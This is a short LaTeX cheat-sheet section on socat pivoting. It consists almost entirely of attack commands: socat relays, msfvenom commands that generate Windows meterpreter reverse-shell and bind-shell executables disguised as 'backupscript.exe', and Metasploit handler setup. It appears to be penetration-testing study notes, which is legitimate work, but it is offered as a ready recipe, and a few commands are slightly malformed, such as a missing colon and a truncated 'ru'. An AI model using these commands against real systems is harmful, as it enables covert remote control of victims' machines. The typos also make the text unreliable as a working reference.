
\section{Socat pivoting}

\subsection{With reverse shell}

\begin{verbatim}
socat TCP4-LISTEN:$P_PORT,fork TCP4:$L_IP:$L_PORT
\end{verbatim}

\begin{verbatim}
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$P_IP -f exe -o
backupscript.exe LPORT=$P_PORT
\end{verbatim}

\begin{verbatim}
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
msf6 exploit(multi/handler) > run
\end{verbatim}

\subsection{With bind shell}


\begin{verbatim}
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe
LPORT=$TPORT
\end{verbatim}


\begin{verbatim}
socat TCP4-LISTEN:$PPORT,fork TCP$TIP:$TPORT
\end{verbatim}



\begin{verbatim}
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST $PIP
msf6 exploit(multi/handler) > set LPORT PPORT
msf6 exploit(multi/handler) > ru
\end{verbatim}
